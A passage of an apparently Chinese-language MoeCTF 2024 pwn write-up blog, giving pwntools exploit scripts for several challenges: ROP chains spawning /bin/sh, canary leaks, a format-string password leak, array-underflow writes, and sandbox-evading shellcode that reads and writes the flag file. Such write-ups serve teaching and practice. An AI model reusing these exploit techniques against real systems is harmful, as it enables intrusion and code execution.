<span class="built_in">printf</span>(<span class="string">"%ld,"</span>, random());</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>输出0xa次的随机数并记录，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/5mGwaBpfPkuYbz6NjAEjg?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./prerandom")</span></span><br><span class="line"></span><br><span class="line">rand = [<span class="number">666013448</span>,<span class="number">768862621</span>,<span class="number">1035996543</span>,<span class="number">271022445</span>,<span class="number">1992279851</span>,<span class="number">457888285</span>,<span class="number">9828597</span>,<span class="number">2035788471</span>,<span class="number">1569542676</span>,<span class="number">1054662629</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b"Guess a five-digit number I'm thinking of\n&gt; "</span>, <span class="built_in">str</span>(rand[i] % <span class="number">90000</span> + <span class="number">10000</span>))</span><br><span class="line">        </span><br><span class="line">p.sendlineafter(<span class="string">b"Guess a five-digit number I'm thinking of\n&gt; "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{RANdoM-num6Ers-4re-PreD1cTA6I36c63c9}</code></p>
+<h3 id="flag_helper">9 flag_helper</h3>
+<p>fuzz，啥都不给，玩不来一点。</p>
+<h3 id="这是什么got">10 这是什么？GOT！</h3>
+<p>环境问题，暂时没通 。</p>
+<h3 id="nx_on">11 NX_on！</h3>
+<p>感觉是程序环境有点问题，j_memcpy一直跳不进去，不知道什么情况。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = websocket("wss://ctf.xidian.edu.cn/api/traffic/OoMhVpkJtqDtQK14IvBWW?port=9999")</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary_t = <span class="string">b"A"</span> * <span class="number">25</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"Your id?"</span>, canary_t)</span><br><span class="line">p.recvuntil(canary_t)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">p.info(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">24</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040a40e</span>) <span class="comment"># payloadopayload rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004e3940</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004508b7</span>) <span class="comment"># payloadopayload rax ; ret</span></span><br><span class="line">payload += <span class="string">b'/bin//sh'</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000452e15</span>) <span class="comment"># mov qword payloadtr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040a40e</span>) <span class="comment"># payloadopayload rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004e3948</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000445650</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000452e15</span>) <span class="comment"># mov qword payloadtr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040239f</span>) <span class="comment"># payloadopayload rdi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004e3940</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040a40e</span>) <span class="comment"># payloadopayload rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004e3948</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x000000000049d12b</span>) <span class="comment"># payloadopayload rdx ; payloadopayload rbx ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004e3948</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># payloadadding</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000445650</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004508b7</span>) <span class="comment"># pop rax</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(<span class="number">0x0000000000402154</span>) <span class="comment"># syscall</span></span><br><span class="line">payload = payload.ljust(<span class="number">256</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">p.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendafter(<span class="string">b"Your real name?\n"</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b"give me the size of your real name , 0 means quit\n"</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="这是什么32-bit">12 这是什么？32-bit！</h3>
+<p>IDA查看，有一个vuln函数有一个溢出点</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928092905703.png"></p>
+<p>一个backdoor函数，给了execve，但是给的是错误的命令。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928092930808.png"></p>
+<p>查看字符串，该有的都有</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928093002068.png"></p>
+<p>常规32位rop，传参的时候要注意返回地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/wpKDKtDIBhevXOFw2SY4H?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./backdoor")</span></span><br><span class="line">elf = ELF(<span class="string">"./backdoor"</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b"A"</span> * (<span class="number">36</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">1</span>) </span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line"></span><br><span class="line">payload += padding</span><br><span class="line">payload += p32(elf.plt[<span class="string">"execve"</span>])</span><br><span class="line">payload += p32(elf.sym[<span class="string">"main"</span>])</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804A011</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># data:0804C030</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{8aCk_to_THE_g00D_0ld_d4Y5abd08649}</code></p>
+<h3 id="moeplane">13 Moeplane</h3>
+<p>一个简单的fuzz，给了一张图片，表示这个结构体里面的成员变量：</p>
+<figure>
+<img src="/2024/09/28/MOECTF/image-20241007003445301.png" alt><figcaption>image-20241007003445301</figcaption>
+</figure>
+<p>连接远程看看，好像背景是一个空难，然后有四个引擎。我们可以通过<code>adjust</code>去手动调引擎的动力，但是这些引擎会随着时间而逐渐崩溃。</p>
+<p><img src="/2024/09/28/MOECTF/image-20241007003635180.png"></p>
+<p><code>adjust engine thrust</code>选项接受两个参数：</p>
+<ul>
+<li>引擎的序号</li>
+<li>要调整的动力值</li>
+</ul>
+<p><img src="/2024/09/28/MOECTF/image-20241007003859135.png"></p>
+<p>这里限制了动力值只能0~100</p>
+<p>根据上面的图片可能会有数组反向溢出。</p>
+<p>试验一下，把-12偏移的位置改成30.</p>
+<p><img src="/2024/09/28/MOECTF/image-20241007004807834.png"></p>
+<p>成功了，真的有这个漏洞。那接下来只要算好偏移逐字节改掉就好了。</p>
+<p>但是还有一个问题，就是我们只能改0~100的数字，如果我们要改<code>0xf1</code>这种有字符的就不行了。</p>
+<p>后来发现那个<code>target</code>的值就是<code>0x1020304050</code></p>
+<p>真好，都不用费劲了，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/9CtVFdIvhycESYKLEo7ep?port=9999"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"Target: "</span>)</span><br><span class="line">target = <span class="built_in">eval</span>(p.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">p.recv()</span><br><span class="line">p.info(<span class="built_in">hex</span>(target))</span><br><span class="line"><span class="comment"># p.info(hex(138248474624))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(-<span class="number">19</span> + i))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>((target &gt;&gt; (i * <span class="number">8</span>)) % <span class="number">0x100</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>((target &gt;&gt; (i * <span class="number">8</span>)) % <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{COmpUtEr_f@1IUrE-w0nT_IeT_y0u_fLy360cd5}</code></p>
+<h3 id="loginsystem">14 LoginSystem</h3>
+<p>IDA查看，有一个fmt_str漏洞，可以利用它去泄露password。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928093352506.png"></p>
+<p>比较方便，没有开PIE，先把password的地址布在栈上，然后利用<code>%s</code>泄露即可。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/1ZPqnYwOuH35AlqgGmJIs?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x404050</span></span><br><span class="line"><span class="comment"># AAAAAAAA-0x7ffd3e690220-(nil)-0x7f150258b887-0x9-0x7f15026b7040-0x7f150268e600-</span></span><br><span class="line"><span class="comment"># 0x7f15025015ad-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70</span></span><br><span class="line">addr = <span class="number">0x404050</span></span><br><span class="line">offset = <span class="number">8</span></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"%9$s"</span>.ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">payload += p64(<span class="number">0x404050</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"Welcome, "</span>)</span><br><span class="line">password = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(password))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{0H_you_CaN_byP4SS_ThE_P4ssw0rd1449ada}</code></p>
+<h3 id="catch_the_canary">15 Catch_the_canary!</h3>
+<p>简单的<code>scanf</code>输入跳过 + 爆破 + <code>canary</code>绕过</p>
+<p>查看程序，程序中提供了一个后门函数帮助<code>getshell</code></p>
+<p><img src="/2024/09/28/MOECTF/image-20240929164849567.png"></p>
+<p>main函数里面最下面有一个溢出点，第一次输入可以用来泄露<code>canary</code>， 第二次输入可以跳转到后门函数。</p>
+<p>但在此之前main函数里面还加了几层限制。</p>
+<ul>
+<li><p>第一步是让输入一个数和一个随机数校验，但观察到有一个while循环，可以无限次输入。还观察到随机数是有范围的，(对0x2345取余)所以这里进行一个简单的爆破即可。</p></li>
+<li><p>第二步也是一个校验，需要对<code>v9</code>数组里面的元素赋值，赋值之后要检查和原来的值是否一样，这里用一个小trick跳过就好了。</p>
+<blockquote>
+<p><code>scanf</code>函数在输入整形数时。如果输入<code>+</code>,<code>-</code>等符号会跳过本次输入。</p>
+</blockquote></li>
+<li><p>第三步需要比较<code>v10</code>是否等于一个数，上面的<code>scanf</code>实际上是有一个溢出的，数组只有两个元素可以通过下标溢出到<code>v10</code>。只需要再第三次输入的时候把那个数输进去就好。</p></li>
+</ul>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/wkkFXsO3xlIEOEepIUNoc?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./mycanary")</span></span><br><span class="line">elf = ELF(<span class="string">"./mycanary"</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2345</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i + <span class="number">16768186</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"Cage"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">195874819</span>))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * (<span class="number">24</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload + <span class="string">b"\n"</span>)</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">24</span></span><br><span class="line">payload += canary</span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x4012C9</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{tHRe3-b@siC_W4Ys-For-C@nARY_bYPa5S1ng2a63}</code></p>
+<h3 id="shellcode_revenge">16 shellcode_revenge</h3>
+<p>IDA查看程序，加了沙箱ban了system，然后还有一堆的函数。一个个看。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928094101502.png"></p>
+<p>在admin log中会对pwd进行一次随机初始化（仅进行一次，后续运行admin log不会初始化），需要我们输入密码，才能把level提升到1。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928094434492.png"></p>
+<p>同时我们观察到pwd是作为全局变量的，create函数中有一个负数溢出，我们可以直接把地址溢出到pwd的地址处，读写覆盖。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928094707280.png"></p>
+<p>覆盖之后我们就可以调用<code>operator</code>函数去注入shellcode了。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928095010941.png"></p>
+<p>但是operator里面有对shellcode长度的限制。没关系，我只需要<code>0xA</code>字节就可以实现shellcode的覆写。</p>
+<p>也算是这个月见的新题了，之前在校巴上玩shellcode_master学到的。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928095122351.png"></p>
+<p>我们看这段汇编，<code>call rdx</code>指令就是调用shellcode的，<code>call</code>指令会将返回地址压栈，就是<code>0x1785</code></p>
+<p>所以我们可以在<code>shellcode</code>里面把这个地址<code>pop</code>出来，获取到程序的真实地址，之后控一下rdx寄存器，再跳转到<code>0x175d</code>就可以完成shellcode的重写。这段shellcode利用<code>pop | push | jmp</code>操作的话最短可以到<code>0xA</code>的长度。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ban execve</span></span><br><span class="line">offset = <span class="number">0x1785</span>-<span class="number">0x175d</span></span><br><span class="line">shell_read = <span class="string">"""</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    sub rbx, {}</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    jmp rbx </span></span><br><span class="line"><span class="string">"""</span>.<span class="built_in">format</span>(offset)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>关于控<code>rdx</code>寄存器：因为这里一般的思路是<code>push</code>一个数，然后再<code>pop</code>给<code>rdx</code>。但是这样的话达不到最小的长度利用。我们可以通过动态调试看看<code>pop</code>完<code>rbx</code>之后栈顶数据是啥，如果很大的话不如直接<code>pop</code>给<code>rdx</code>，又节省空间又省事。</p>
+</blockquote>
+<p>覆写shellcode，注意到程序加了沙箱，所以需要用orw绕过。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = websocket("wss://ctf.xidian.edu.cn/api/traffic/ZiI1FhlbA2BP4mWhEgntg?port=9999")</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ban execve</span></span><br><span class="line">offset = <span class="number">0x1785</span>-<span class="number">0x175d</span></span><br><span class="line">shell_read = <span class="string">"""</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    sub rbx, {}</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    jmp rbx </span></span><br><span class="line"><span class="string">"""</span>.<span class="built_in">format</span>(offset)</span><br><span class="line"></span><br><span class="line">flag_qword = u64(<span class="string">b"flag"</span>.ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line"></span><br><span class="line">shell_orw = <span class="string">"""</span></span><br><span class="line"><span class="string">    mov rbx, {}</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rcx, rsp</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rdi, rcx</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 3</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    sub rsi, 0x100</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span>.<span class="built_in">format</span>(flag_qword)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(asm(shell_read))</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shell_orw))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{g00D_J0b-you-aRe-S0-cIEVeR41bfaabd}</code></p>
+<h3 id="pwn_it_off">17 Pwn_it_off!</h3>
+<p>IDA查看程序</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100055987.png"></p>
+<p>beep函数会进行不定次数的v3初始化，每次初始化都是随机的。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100107938.png"></p>
+<p>之后我们需要绕过<code>voice_pwd</code>, <code>num_pwd</code>两次验证，就能拿到flag</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100218900.png"></p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100228931.png"></p>
+<p>很明显在进行验证之前并没有进行栈的清理，导致之前的数据还在，而beep函数开的栈是最大的，还会将v3给输出出啦。</p>
+<p>所以我们可以利用beep函数的脏数据绕过voice_pwd，通过voice_pwd的<code>\x00</code>截断绕过<code>strcmp</code>，布置脏数据给<code>num_pwd</code>使用。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 